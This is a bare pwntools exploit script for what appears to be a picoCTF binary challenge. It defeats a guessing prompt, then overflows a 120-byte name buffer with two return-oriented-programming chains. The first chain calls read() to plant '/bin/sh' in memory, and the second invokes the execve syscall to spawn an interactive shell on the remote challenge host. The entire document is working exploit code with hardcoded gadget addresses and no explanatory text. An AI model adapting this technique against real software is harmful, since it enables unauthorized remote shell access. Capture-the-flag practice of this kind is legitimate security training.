#!/usr/bin/env python3

from pwn import *

EXE = "./vuln"

context.binary = EXE

elf = ELF(EXE)

if args.DEBUG:
    context.log_level = 'DEBUG'

if args.REMOTE:
    io = remote("shape-facility.picoctf.net",57651)
else:
    io = process()

context.gdb_binary = "pwndbg"
if args.TMUX:
    context.terminal = ['tmux', 'split-pane', '-h']
if args.GDB and not args.REMOTE:
    gdb.attach(io,gdbscript='')

io.recvuntil(b"guess?")
io.sendline(b"84")
io.recvuntil(b"Name? ")

bin_sh = b"/bin/sh\0"

payload = b""
payload += b"A"*120
payload += p64(0x4006a6) # pop rdi ; ret
payload += p64(0x0) # read
payload += p64(0x410b93) # pop rsi ; ret
payload += p64(0x6b7000) # buf
payload += p64(0x410602) # pop rdx ; ret
payload += p64(len(bin_sh)) # count
payload += p64(elf.symbols["read"])
payload += p64(elf.symbols["main"])

io.sendline(payload)
io.sendline(bin_sh)

io.recvuntil(b"guess?")
io.sendline(b"78")
io.recvuntil(b"Name? ")

payload = b""
payload += b"A"*120
payload += p64(0x4005af) # pop rax ; ret
payload += p64(0x3b) # execve
payload += p64(0x4006a6) # pop rdi ; ret
payload += p64(0x6b7000) # /bin/sh0
payload += p64(0x410b93) # pop rsi ; ret
payload += p64(0) # argv
payload += p64(0x410602) # pop rdx ; ret
payload += p64(0) # envp
payload += p64(0x40138c) # syscall

io.sendline(payload)

io.interactive()
